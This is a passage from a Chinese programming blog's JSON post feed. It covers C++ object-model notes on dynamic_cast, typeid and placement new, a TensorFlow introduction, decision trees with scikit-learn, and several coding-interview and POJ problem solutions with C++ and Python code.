x3)a1 - (x1 - x2)a2}{(y1 - y2)(x1 - x3)-(x1 - x2)(y1-y3)}$ 最后代码如下 123456789101112131415161718192021222324252627import numpy as npimport matplotlib.pyplot as pltfrom matplotlib.patches import Circledef circle(x1, y1, x2, y2, x3, y3): a = x1 - x2 b = y1 - y2 c = x1 - x3 d = y1 - y3 a1 = ((x1 * x1 - x2 * x2) + (y1 * y1 - y2 * y2)) / 2.0 a2 = ((x1 * x1 - x3 * x3) + (y1 * y1 - y3 * y3)) / 2.0 theta = b * c - a * d; if abs(theta) &lt; 1e-7: return -1 x0 = (b * a2 - d * a1) / theta; y0 = (c * a1 - a * a2) / theta; r = np.sqrt(pow((x1 - x0), 2)+pow((y1 - y0), 2)) fig = plt.figure() ax = fig.add_subplot(111) cir = Circle(xy = (x0, y0), radius = r, alpha=0.4) ax.add_patch(cir) plt.axis('scaled') plt.axis('equal') plt.plot(x1,y1,'r*',x2,y2,'r*',x3,y3,'r*') plt.show()circle(0, 0, 0, 1, 1, 0) 结果为","categories":[{"name":"算法","slug":"算法","permalink":"http://coordinate.wang/categories/算法/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"算法","slug":"算法","permalink":"http://coordinate.wang/tags/算法/"}]},{"title":"深度探索c++对象模型(7)","slug":"2017-09-23-深度探索c++对象模型(7)","date":"2017-09-22T16:00:00.000Z","updated":"2018-02-18T03:29:07.262Z","comments":true,"path":"2017/09/23/2017-09-23-深度探索c++对象模型(7)/","link":"","permalink":"http://coordinate.wang/2017/09/23/2017-09-23-深度探索c++对象模型(7)/","excerpt":"","text":"dynamic_cast深入我在之前的文章里面有介绍过dynamic_cast ，但是对于它背后的实现原理一直没有探究，所以我会在本文中深入探究他背后的东西。 之所以要使用dynamic_cast，主要就是解决downcast不安全的问题。 1234567891011class node&#123;&#125;;class type:public node &#123;&#125;;class fct: public type&#123;&#125;;class gen: public type&#123;&#125;;typedef type* ptype;typedef fct* pfct;simplify_conv_op(ptype pt)&#123; if(pfct pf = dynamic_cast&lt;pfct&gt;(pt))&#123;&#125; else&#123;&#125;&#125; pt指向的class object类型描述器必须在执行期通过vptr取得，下面是一种可能的编译器转换形式 1((type_info*)(pt-&gt;vptr[0]))-&gt;_type_descriptor; type_info是c++ standard所定义的类型描述器的class名称，virtual的第一个slot内含type_info object的地址。你可能对于这里有疑问了，我在之前有写过深度探索c++对象模型(4).html) ，我在最后留有一个还没有解决的问题？对，之前那个没有解决的问题 _meta ，就是type_info，而且最后画的那张图应该就要变成这样 当然这里我又再次忘记了左边的两个后面补0 ): 。 references和pointers并不同如果你对这个标题感到非常的疑惑，你认为这两个就是不同的。好吧，接下去的内容你都可以忽略了。因为如果你是一个菜鸟，你当然理解不了他们之间何其相似；如果你对c++很熟悉的话，那你一定知道这两个之间的区别。 程序执行中对一个 class 指针类型施以 dynamic_cast 运算符,会获得 true 或 false: 如果传回真正的地址，表示这个object的动态类型被确认了，一些与类型有关的操作现在可以作用于其上。 如果传回0，表示没有指向任何object，意味着应该以另一种逻辑施行于这个动态类型未确定的object上。 很多时候我也是觉得reference和pointer没有区别，确实，这两者确实在一般的情况下可以看成等同。但是，dynamic_cast运算符用在reference上面就会出一些问题。为什么？一个reference不可以像pointer那样把0当作no object看待。如果把一个reference设为0，会引起一个临时对象，如下： 1const point&lt;float&gt; &amp;ref = 0; 它会instantiate一个point的float的实体。 12point&lt;float&gt; temporary(float(0));const point&lt;float&gt; &amp;ref = temporary; 因为reference并不是no object的代名词。0被视为整数，必须别转换为一下类型的对象： 1point&lt;float&gt; 因此当dynamic_cast运算符运用一个reference时，不能够提供对等于指针情况下的那一组true/false。取而代之会发生下面的事： 如果reference真正参考到适当的derived class，downcast会被执行。 如果reference并不是真正的是某种derived class，那么，由于不能传回0，所以丢出一个bad_cast execption 如下： 123456789simplify_conv_op(const type &amp;rt)&#123; try &#123; fct &amp;rf = dynamic_cast&lt;fct&amp;&gt;(rt); &#125; catch(bad_cast) &#123;&#125;&#125; 结果也是很显然的表现出某种execption failure 那我么要怎么才可以使用reference呢？ Typeid运算符12345678simplify_conv_op(const type &amp;rt)&#123; if(typeid(rt) == typeid(fct)) &#123; fct &amp;rf = dynamic_cast&lt;fct&amp;&gt;(rt); &#125; else&#123;&#125;&#125; 这样做就可以了。 typeid运算符返回一个const reference，类型是type_info。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"深度探索c++对象模型(6)","slug":"2017-09-22-深度探索c++对象模型(6)","date":"2017-09-21T16:00:00.000Z","updated":"2018-02-18T03:29:07.262Z","comments":true,"path":"2017/09/22/2017-09-22-深度探索c++对象模型(6)/","link":"","permalink":"http://coordinate.wang/2017/09/22/2017-09-22-深度探索c++对象模型(6)/","excerpt":"","text":"类里面返回类型不同的重载方法123456789class Foo&#123;public: Foo(); const int val(); int val();private: int _val;&#125;; 我是用的编译器vs2015会报这样的错误 无法重载仅含返回类型不同的函数 当仅需读 _val 时，调用 const int val(); 当需要更改 _val 时，调用 int val(); ，而现在由于C++不支持这种情况，那麽我们只能采取折衷的方案，第一种方法是，在读写的地方都使用 int val(); ，对于仅需要读的地方，这样做破坏了程序的本意；第二种做法是在仅读的地方，调用 const int val(); ，这样的话，在需要写的地方，就必须要强制类型转换，如： 12Foo test; Foo *val = (Foo *)&amp;test.val(); 那有没有一种方法是可以同时支持这种定义的呢？ 答案是有的，不过让人感觉很邪恶 123456789#define GET_DATA() \\ public:\\ const int val();\\ int val(); class Foo &#123; GET_DATA() private: int _val;&#125;; 不过我最近在测试时发现，这种做法在vs2015上不可行了。 但是不能放弃是吧，所以又有了这种做法 ，这种思路可以学习，但是在类里面实现的时候碰到了一些问题。 然后还是不死心啊，所有就找啊找，终于又找到了一种方案 123456789101112131415161718192021class My &#123;public: int getInt() &#123; return 1; &#125; char getChar() &#123; return 'x'; &#125; class Proxy &#123; My* myOwner; public Proxy(My* owner) : myOwner(owner) &#123;&#125; operator int() const &#123; return myOwner-&gt;getInt(); &#125; operator char() const &#123; return myOwner-&gt;getChar(); &#125; &#125;; Proxy get(My* i) &#123; return Proxy(i); &#125;&#125;; 还有这种方案 123456class My&#123;public: void get(int, int&amp;); void get(int, char&amp;);&#125; placement operator new语义对于placement operator new(), 它的第一个函数参数必须是std::size_t, 表示申请的内存的大小 12void * operator new (std::size_t) throw(std::bad_alloc); // 标准版本void * operator new (std::size_t, const std::nothrow_t &amp;) throw(); // placement 版本 在用户自定义空间上构建对象, 是placement new的本意, 它也被做到C++标准中, 作为default placement: 1void * operator new (std::size_t, void * p) throw() &#123; return p ; &#125; 相应的 placement new expression 使用起来就是这样: 12void *buffer = malloc(sizeof(ClassA));ClassA *ptr = new(buffer)ClassA(); 实际上就是 1operator new (sizeof(ClassA), this); 由于创建对象时，operator new只能通过new关键字隐式调用，无法通过命名空间限定调用的版本，所以一旦在类中定义了operator new的重载版本，所有类外定义的operator new重载都会失效。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"tensorflow入门(1)","slug":"2017-09-12-tensorflow入门(1)","date":"2017-09-11T16:00:00.000Z","updated":"2018-02-18T03:29:07.260Z","comments":true,"path":"2017/09/12/2017-09-12-tensorflow入门(1)/","link":"","permalink":"http://coordinate.wang/2017/09/12/2017-09-12-tensorflow入门(1)/","excerpt":"","text":"占位符12x = tf.placeholder(\"float\", shape=[None, 784])y_ = tf.placeholder(\"float\", shape=[None, 10]) 这里的x和y是一个占位符，可以在TensorFlow运行某一计算时根据该占位符输入具体的值。 输入x是一个2维的浮点数张量。这里，分配给它的shape为[None, 784]，None表示其值大小不定，在这里作为第一个维度值。输出类别值y_也是一个2维张量，其中每一行为一个10维的向量。 变量1234import tensorflow as tfsess = tf.InteractiveSession()W = tf.Variable(tf.zeros([784,10]))b = tf.Variable(tf.zeros([10])) 我们在调用tf.Variable的时候传入初始值。在这个例子里，我们把W和b都初始化为零向量。W是一个784x10的矩阵（因为我们有784个特征和10个输出值）。b是一个10维的向量（因为我们有10个分类）。 变量需要通过seesion初始化后，才能在session中使用。这一初始化步骤为，为初始值指定具体值（本例当中是全为零），并将其分配给每个变量,可以一次性为所有变量完成此操作。 1sess.run(tf.initialize_all_variables()) 在tensorflow最新版本中变为了 1sess.run(tf.global_variables_initializer()) 卷积和池化123456def conv2d(x, W): return tf.nn.conv2d(x, W, strides=[1, 1, 1, 1], padding='SAME')def max_pool_2x2(x): return tf.nn.max_pool(x, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME') 我们的卷积使用1步长（stride size），这里的stride包含四个参数[batch, height ,width, channels](即样本数目，样本的高度，样本的宽度，样本的通道数)。0边距（padding size）的模板，这里padding有两个参数。 &quot;VALID&quot; = without padding: 123inputs: 1 2 3 4 5 6 7 8 9 10 11 (12 13) |________________| dropped |_________________| &quot;SAME&quot; = with zero padding: 12345 pad| |padinputs: 0 |1 2 3 4 5 6 7 8 9 10 11 12 13 |0 0 |________________| |_________________| |________________| 保证输出和输入是同一个大小。我们的池化用简单传统的2x2大小的模板做max pooling。 tf.nn.conv2d(input, filter, strides, padding, use_cudnn_on_gpu=None, name=None) 除去name参数用以指定该操作的name，与方法有关的一共五个参数： 第一个参数input：指需要做卷积的输入图像，它要求是一个Tensor，具有 [batch, in_height, in_width, in_channels] 这样的shape，具体含义是[训练时一个batch的图片数量, 图片高度, 图片宽度, 图像通道数]，注意这是一个4维的Tensor，要求类型为float32和float64其中之一 第二个参数filter：相当于CNN中的卷积核，它要求是一个Tensor，具有 [filter_height, filter_width, in_channels, out_channels] 这样的shape，具体含义是[卷积核的高度，卷积核的宽度，图像通道数，卷积核个数]，要求类型与参数input相同，有一个地方需要注意，第三维in_channels，就是参数input的第四维 第三个参数strides：卷积时在图像每一维的步长，这是一个一维的向量，长度4 第四个参数padding：string类型的量，只能是”SAME”,”VALID”其中之一，这个值决定了不同的卷积方式（后面会介绍） 第五个参数：use_cudnn_on_gpu:bool 类型，是否使用cudnn加速，默认为true 结果返回一个Tensor，这个输出，就是我们常说的feature map tf.nn.max_pool(value, ksize, strides, padding, name=None) 参数是四个，和卷积很类似： 第一个参数value：需要池化的输入，一般池化层接在卷积层后面，所以输入通常是feature map，依然是[batch, height, width, channels]这样的shape 第二个参数ksize：池化窗口的大小，取一个四维向量，一般是[1, height, width, 1]，因为我们不想在batch和channels上做池化，所以这两个维度设为了1 第三个参数strides：和卷积类似，窗口在每一个维度上滑动的步长，一般也是[1, stride,stride, 1] 第四个参数padding：和卷积类似，可以取’VALID’ 或者’SAME’ 返回一个Tensor，类型不变，shape仍然是[batch, height, width, channels]这种形式","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://coordinate.wang/tags/深度学习/"},{"name":"tensorflow","slug":"tensorflow","permalink":"http://coordinate.wang/tags/tensorflow/"}]},{"title":"接啤酒","slug":"2017-09-08-接啤酒问题","date":"2017-09-07T16:00:00.000Z","updated":"2018-02-18T03:29:07.238Z","comments":true,"path":"2017/09/08/2017-09-08-接啤酒问题/","link":"","permalink":"http://coordinate.wang/2017/09/08/2017-09-08-接啤酒问题/","excerpt":"","text":"题目描述酒馆里有m个龙头可供顾客们接啤酒，每个龙头每秒的出酒量相等，都是1。现有n名顾客准备接酒，他们初始的接酒顺序已经确定。将这些顾客按接酒顺序从1到n编号，i号顾客的接酒量为w_i。接酒开始时，1到m号顾客各占一个龙头，并同时打开龙头接酒。当其中某个顾客j完成其接酒量要求wj后，下一名排队等候接酒的顾客k马上接替j顾客的位置开始接酒。这个换人的过程是瞬间完成的，且没有任何酒的浪费。即j顾客第x秒结束时完成接酒，则k顾客第x+1秒立刻开始接酒。若当前接酒人数n不足m，则只有n个龙头供酒，其它m-n个龙头关闭。现在给出n名顾客的接酒量，按照上述规则，问所有顾客都接完酒需要多少秒？ 输入描述输入包括两行，第一行为以空格分割的两个数n和m, 分别表示接酒的人数和酒龙头个数，均为正整数。 第二行n个整数w_i，(1 &lt;= w_i &lt;= 100)表示每个顾客接酒量 输出描述如果输入合法输出接酒所需总时间(秒)。 样例输入5 34 4 1 2 1 样例输出4 这个问题最简单的做法是使用优先队列，但是我觉得我写的并不是非常的完美 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;functional&gt;int main(void)&#123; size_t m, n; std::priority_queue&lt;int, std::vector&lt;int&gt;, std::greater&lt;int&gt;&gt; que; while (std::cin &gt;&gt; n &gt;&gt; m) &#123; std::vector&lt;int&gt; arr(n); for (int i = 0; i &lt; n; ++i) &#123; std::cin &gt;&gt; arr[i]; &#125; if (n &gt; m) &#123; for (int i = 0; i &lt; m; ++i) &#123; que.push(arr[i]); &#125; for (int i = m; i &lt; n; ++i) &#123; int temp = que.top(); que.pop(); que.push(arr[i] + temp); &#125; &#125; else &#123; for (int i = 0; i &lt; n; ++i) &#123; que.push(arr[i]); &#125; &#125; while ((que.size() - 1) != 0) que.pop(); std::cout &lt;&lt; que.top(); &#125;&#125; 下面这个使用了一种非常巧妙的方法 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;vector&gt;int main(void)&#123; size_t m, n; while (std::cin &gt;&gt; n &gt;&gt; m) &#123; std::vector&lt;size_t&gt; arr(n); for (int i = 0; i &lt; n; ++i) &#123; std::cin &gt;&gt; arr[i]; &#125; int times = 0; while (true) &#123; int flag = 0; //标记是否有人接水 int num = 0; for (int i = 0; i &lt; n; ++i) &#123; if (arr[i] &gt; 0) &#123; flag = 1; --arr[i]; ++num; //当n &gt; m时，这时候人数大于龙头数 if (num == m) break; &#125; &#125; if (flag) ++times; else break; &#125; std::cout &lt;&lt; times &lt;&lt; std::endl; &#125;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"笔试","slug":"笔试","permalink":"http://coordinate.wang/tags/笔试/"}]},{"title":"特殊约瑟夫环问题","slug":"2017-09-07-约瑟夫环问题","date":"2017-09-06T16:00:00.000Z","updated":"2018-02-18T03:29:07.222Z","comments":true,"path":"2017/09/07/2017-09-07-约瑟夫环问题/","link":"","permalink":"http://coordinate.wang/2017/09/07/2017-09-07-约瑟夫环问题/","excerpt":"","text":"题目描述100个人围成一圈，每个人有一个编码，编号从1开始到100。他们从1开始依次报数，报到为M的人自动退出圈圈，然后下一个人接着从1开始报数，直到剩余人数小于M。请问最后剩余的人在原先的编号为多少？例如输入M=3时，输出为：“58,91”，输入M=4时，输出为：“34,45,97” 输入描述函数原型void NumberOffGame(int m, char * output); 输入的m，m为大于1且小于100的整数。 输出描述输出output，其中output已经分配足够的内存空间，无需单独分配；如果m输入小于等于1，则输出“ERROR!”；如果m输入大于等于100，则输出“ERROR!”；否则按照编号从小到大的顺序，以”,”分个输出编号字符串，输出的字符串中标点符号均为半角字符。 样例输入3 样例输出58,91 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;iostream&gt;#include &lt;vector&gt;void NumberOffGame(int m, char * output) //说实话我被这个接口的设计恶心到了&#123; std::vector&lt;int&gt; num; for (int i = 1; i &lt;= 100; ++i) &#123; num.push_back(i); &#125; int count = 0; while(num.size() &gt;= m) &#123; int goal = (count + m - 1) % num.size(); num.erase(std::begin(num) + goal); count = goal % num.size(); &#125; char temp[100] = &#123; 0 &#125;; int out_size = 0; if (num.size() == 1) &#123; snprintf(output, 10000, \"%d\", num[0]); &#125; else &#123; for (int i = 0; i &lt; num.size(); ++i) &#123; snprintf(temp, 100, \"%d\", num[i]); int temp_size = std::strlen(temp); int j = 0; if (i == 0) &#123; while (j &lt; temp_size) &#123; output[out_size] = temp[j++]; ++out_size; &#125; &#125; else &#123; output[out_size++] = ','; while (j &lt; temp_size) &#123; output[out_size] = temp[j++]; ++out_size; &#125; &#125; &#125; &#125; &#125;int main()&#123; size_t m; while (std::cin &gt;&gt; m) &#123; if (m &lt;= 1 || m &gt;= 100) &#123; std::cout &lt;&lt; \"ERROR!\"; return -1; &#125; char output[10000] = &#123; 0 &#125;; NumberOffGame(m, output); std::cout &lt;&lt; output &lt;&lt; std::endl; &#125;&#125; 我不太清楚c++14是否能更加的简洁，我后来又想了一个稍微简洁的版本 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;std::string str_out;void NumberOffGame(int m, char * output)&#123; std::vector&lt;int&gt; num; for (int i = 1; i &lt;= 100; ++i) &#123; num.push_back(i); &#125; int count = 0; while(num.size() &gt;= m) &#123; int goal = (count + m - 1) % num.size(); num.erase(std::begin(num) + goal); count = goal % num.size(); &#125; for (int i = 0; i &lt; num.size() - 1; ++i) &#123; str_out += std::to_string(num[i]) + ','; &#125; str_out += std::to_string(num[num.size() - 1]); snprintf(output, 10000, str_out.c_str());&#125;int main()&#123; size_t m; while (std::cin &gt;&gt; m) &#123; if (m &lt;= 1 || m &gt;= 100) &#123; std::cout &lt;&lt; \"ERROR!\"; return -1; &#125; char output[10000] = &#123; 0 &#125;; NumberOffGame(m, output); std::cout &lt;&lt; output &lt;&lt; std::endl; &#125;&#125; 这个解法看上去比原先那个版本好多了，还有一种做法是通过入队出队来实现的，我觉得也是非常不错的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;string&gt;std::string str_out;void NumberOffGame(int m, char * output)&#123; std::queue&lt;int&gt; num; for (int i = 1; i &lt;= 100; ++i) &#123; num.push(i); &#125; int count = num.size(); int shu = 1; while (count &gt;= m) &#123; if (shu != m) &#123; int front = num.front(); num.pop(); num.push(front); ++shu; &#125; else &#123; shu = 1; num.pop(); --count; &#125; &#125; for (int i = 0; i &lt; count - 1; ++i) &#123; str_out += std::to_string(num.front()) + ','; num.pop(); &#125; str_out += std::to_string(num.front()); snprintf(output, 10000, str_out.c_str());&#125;int main()&#123; size_t m; while (std::cin &gt;&gt; m) &#123; if (m &lt;= 1 || m &gt;= 100) &#123; std::cout &lt;&lt; \"ERROR!\"; return -1; &#125; char output[10000] = &#123; 0 &#125;; NumberOffGame(m, output); std::cout &lt;&lt; output &lt;&lt; std::endl; &#125;&#125; 还有一种解法是使用数学，推到出相应的递推公式","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"笔试","slug":"笔试","permalink":"http://coordinate.wang/tags/笔试/"}]},{"title":"在字符串中找出连续最长的数字串","slug":"2017-09-06-在字符串中找出连续最长的数字串","date":"2017-09-05T16:00:00.000Z","updated":"2018-02-18T03:29:07.222Z","comments":true,"path":"2017/09/06/2017-09-06-在字符串中找出连续最长的数字串/","link":"","permalink":"http://coordinate.wang/2017/09/06/2017-09-06-在字符串中找出连续最长的数字串/","excerpt":"","text":"题目描述请在一个字符串中找出连续最长的数字串，并把这个串的长度返回；如果存在长度相同的连续数字串，返回最后一个连续数字串； 注意：数字串只需要是数字组成的就可以，并不要求顺序，比如数字串“1234”的长度就小于数字串“1359055”，如果没有数字，则返回空字符串（“”）而不是NULL！ 输入描述字符串 输出描述连续数字串，在所有数字串最长的长度 样例输入abcd12345ed125ss123058789 abcd12345ss54761 样例输出输出123058789，函数返回值9 输出54761，函数返回值5 还是如以前一样，使用两种风格去处理这个问题，第一种是c++98 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123; std::string str; while (std::cin &gt;&gt; str) &#123; std::string str_out; std::string str_max; size_t max_size = 0; for (size_t i = 0; i &lt; str.size(); ++i) &#123; if (isdigit(str[i])) &#123; str_out += str[i]; while (isdigit(str[i + 1])) &#123; ++i; str_out += str[i]; &#125; if (str_out.size() &gt;= max_size) &#123; max_size = str_out.size(); str_max = str_out; &#125; &#125; str_out.clear(); &#125; std::cout &lt;&lt; str_max &lt;&lt; '\\n' &lt;&lt; max_size &lt;&lt; std::endl; &#125;&#125; c++14的风格 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;sstream&gt;int main()&#123; std::string str; while (std::cin &gt;&gt; str) &#123; for (auto&amp; i : str) //这里使用了一个小的技巧，从string流读string默认是忽略空格的，通过设置std::noskipws取消跳过空格 &#123; if (!isdigit(i)) &#123; i = ' '; &#125; &#125; std::stringstream str_temp&#123; str &#125;; //这里使用了string的数据流非常好的处理手法 std::string str_out, str_max; size_t max_size&#123;&#125;; while (str_temp &gt;&gt; str_out) &#123; if (max_size &lt;= str_out.size()) &#123; max_size = str_out.size(); str_max = str_out; &#125; &#125; std::cout &lt;&lt; str_max &lt;&lt; '\\n' &lt;&lt; max_size &lt;&lt; std::endl; &#125;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"笔试","slug":"笔试","permalink":"http://coordinate.wang/tags/笔试/"}]},{"title":"决策树算法","slug":"2017-09-01-决策树算法","date":"2017-08-31T16:00:00.000Z","updated":"2018-02-18T03:29:07.222Z","comments":true,"path":"2017/09/01/2017-09-01-决策树算法/","link":"","permalink":"http://coordinate.wang/2017/09/01/2017-09-01-决策树算法/","excerpt":"","text":"评定一个算法的好坏的标准： 准确率 速度 强壮性 可规模性 可解释性 Decision tree:判断树是一个类似与流程图的树结构，其中内部结点表示在一个属性上的测试，每个分支代表一个属性输出，而每个树叶节点代表类和类分布。树的最顶层是根节点。 熵（entropy）概念： 信息量的度量就等于不确定性的多少。变量的不确定性越大，熵也就越大 决策树归纳算法（ID3） 选择属性判断节点 信息获取量（information Gain）：Gain(A) = Info(D) - Info_A(D)没有A时的信息量-增加A时的信息量。对于连续性数据的处理，就是把它变成离散化。 其他算法： C4.5：QuinLan Classification and Regression Trees（CART） 共同点：都是贪心算法，自上而下（Top-down approach） 区别：属性选择度量方法不同：C4.5(gain ratio)，CART(gini index)，ID3(Information Gain) 剪枝（避免overfitting） 分的太细了 有两种方案：先剪枝，后剪枝 决策树优点：直观，便于理解，小规模数据集有效 决策树缺点：处理连续性变量不好，类别较多时，错误增加的比较快，可规模性一般 决策树的应用Python机器学习的库scikit-learn 覆盖领域： 分类（classification） 回归（regression） 聚类（clustering） 降维（dimensionality reduction） 模型选择（model selection） 预处理（preprocessing） 使用scikit-learn 安装scikit-learn：pip 安装必要的package：numpy，scipy和matplotlib，可使用anaconda 测试数据 RID age income student credit_rating Class_buys_computer 1 youth high no fair no 2 youth high no excellent no 3 middle_aged high no fair yes 4 senior medium no fair yes 5 senior low yes fair yes 6 senior low yes excellent no 7 middle_aged low yes excellent yes 8 youth medium no fair no 9 youth low yes fair yes 10 senior medium yes fair yes 11 youth medium yes excellent yes 12 middle_aged medium no excellent yes 13 middle_aged high yes fair yes 14 senior medium no excellent no 测试代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758'''Created on Sep 1, 2017@author: coordinate'''#coding:utf-8from sklearn.feature_extraction import DictVectorizerimport csvfrom sklearn import preprocessingfrom sklearn.externals.six import StringIOfrom sklearn import treeallElectronicData = open(r'D:\\eclipse workspace\\DeepLearningBasicsMachineLearning\\AllElectronic.csv')reader = csv.reader(allElectronicData) #read by lineheaders = reader.next()print(headers)featureList = []labelList = []for row in reader: labelList.append(row[len(row) - 1]) rowDict = &#123;&#125; for i in range(1, len(row) - 1): rowDict[headers[i]] = row[i] featureList.append(rowDict)print(featureList)vec = DictVectorizer()dummyX = vec.fit_transform(featureList).toarray()print(\"dummyX:\" +str(dummyX))print(vec.get_feature_names())print(\"labelList: \" + str(labelList))lb = preprocessing.LabelBinarizer()dummyY = lb.fit_transform(labelList)print(\"dummyY: \" + str(dummyY))clf = tree.DecisionTreeClassifier(criterion = 'entropy')clf = clf.fit(dummyX, dummyY)print(\"clf: \" + str(clf))with open(\"allElectronicInformationGainOri.dot\", 'w') as f: f = tree.export_graphviz(clf, feature_names=vec.get_feature_names(), out_file = f)#predictoneRowX = dummyX[0, :]print(\"oneRowX: \" + str(oneRowX))newRowX = oneRowXnewRowX[0] = 1newRowX[1] = 0print(\"newRowX: \" + str(newRowX))predictedY = clf.predict(newRowX)print(\"predictedY:\" +str(predictedY)) 测试结果 通过Graphviz显示，在文件夹下建立cmd.bat文件，文件内容为 dot -T pdf allElectronicInformationGainOri.dot -o output.pdf ,运行这个批处理文件即可","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/tags/机器学习/"},{"name":"决策树算法","slug":"决策树算法","permalink":"http://coordinate.wang/tags/决策树算法/"}]},{"title":"机器学习中的基本概念","slug":"2017-08-31-机器学习中的基本概念","date":"2017-08-30T16:00:00.000Z","updated":"2018-02-18T03:29:07.207Z","comments":true,"path":"2017/08/31/2017-08-31-机器学习中的基本概念/","link":"","permalink":"http://coordinate.wang/2017/08/31/2017-08-31-机器学习中的基本概念/","excerpt":"","text":"概念学习：概念学习是指从有关某个布尔函数的输入输出训练样例中推断出布尔函数 概念定义在实例（instance）之上，这个集合表示为X。带学习的概念或目标函数成为目标概念，记作c。c(x) = 1，当享受运动时，c(x) = 0，不享受运行。c(x)记作y。 x：每一个实例 X：所有实例的集合 学习目标：f: X-&gt;Y 训练集/训练样例：进行训练，产生模型或者算法的数据集 测试集/测试样例：专门进行测试已经学习好的模型或者算法的数据集 特征向量（features）：属性的集合，常用一个向量表示，附属于一个实例 标记：(label):c(x) 实例类别的标记 就是对于目标的记号 正例（positive example） 反例（negative example） 分类（classification）:目标标记为类别型数据（category） 回归（regression）：目标标记为连续性数值（continuous numeric value） 有监督学习（supervised learning）：训练有类别标记（class label）训练集知道答案 无监督学习（unsupervised learning）：无类别标记（class label）训练集不知道答案 半监督学习（semi-supervised learning）：有类别标记的训练集+无标记的训练集 机器学习步骤框架 把数据拆分为训练集和测试集 用训练集和训练集的特征向量来训练算法 用学习来的算法运用在测试集上来评估算法（可能要涉及到调整参数（parameter tuning），用验证集（validation set））","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/tags/机器学习/"}]},{"title":"POJ 1017 packets","slug":"2017-08-30-POJ 1017 packets","date":"2017-08-29T16:00:00.000Z","updated":"2018-02-18T03:29:07.202Z","comments":true,"path":"2017/08/30/2017-08-30-POJ 1017 packets/","link":"","permalink":"http://coordinate.wang/2017/08/30/2017-08-30-POJ 1017 packets/","excerpt":"","text":"DescriptionA factory produces products packed in square packets of the same height h and of the sizes 1*1, 2*2, 3*3, 4*4, 5*5, 6*6. These products are always delivered to customers in the square parcels of the same height h as the products have and of the size 6*6. Because of the expenses it is the interest of the factory as well as of the customer to minimize the number of parcels necessary to deliver the ordered products from the factory to the customer. A good program solving the problem of finding the minimal number of parcels necessary to deliver the given products according to an order would save a lot of money. You are asked to make such a program. InputThe input file consists of several lines specifying orders. Each line specifies one order. Orders are described by six integers separated by one space representing successively the number of packets of individual size from the smallest size 1*1 to the biggest size 6*6. The end of the input file is indicated by the line containing six zeros. OutputThe output file contains one line for each line in the input file. This line contains the minimal number of parcels into which the order from the corresponding line of the input file can be packed. There is no line in the output file corresponding to the last line of the input file. Sample Input0 0 4 0 0 17 5 1 0 0 00 0 0 0 0 0 Sample Output21 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iterator&gt;int main()&#123; std::vector&lt;int&gt; box(6); std::vector&lt;int&gt; result; //对于边长为3的板子，只有一块时，需要5个2*2，有两块时，需要3个，有三快时，需要1个，有四块时，需要0个 std::vector&lt;int&gt; mon&#123; 0, 5, 3, 1 &#125;; while (true) &#123; int sum&#123;&#125;; for (int i = 0; i &lt; 6; ++i) &#123; int temp; std::cin &gt;&gt; temp; box[i] = temp; sum += temp; &#125; if (sum == 0) &#123; break; &#125; //如果边长是3 4 5 6 int ans = box[5] + box[4] + box[3] + (box[2] + 3) / 4; //需要边长为2的box数量 int len_2 = box[3] * 5 + mon[(box[2] % 4)]; //2*2 box数量剩余时，需要增加box的数量 if (len_2 &lt; box[1]) &#123; ans += (box[1] - len_2 + 8) / 9; &#125; //需要边长为1的box数量 int len_1 = ans * 36 - box[5] * 36 - box[4] * 25 - box[3] * 16 - box[2] * 9 - box[1] * 4; if (len_1 &lt; box[0]) &#123; ans += (box[0] - len_1 + 35) / 36; &#125; result.push_back(ans); &#125; //容器的最后一行一定是000000 std::copy(std::begin(result), std::end(result), std::ostream_iterator&lt;int&gt;(std::cout, \"\\n\"));&#125; 因为平台不兼容C++14，所以我就写了下面这样的做法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;vector&gt;int main()&#123; std::vector&lt;int&gt; box(6); std::vector&lt;int&gt; result; //对于边长为3的板子，只有一块时，需要5个2*2，有两块时，需要3个，有三快时，需要1个，有四块时，需要0个 int mon[4] = &#123; 0, 5, 3, 1&#125;; while (true) &#123; int sum = 0; for (int i = 0; i &lt; 6; 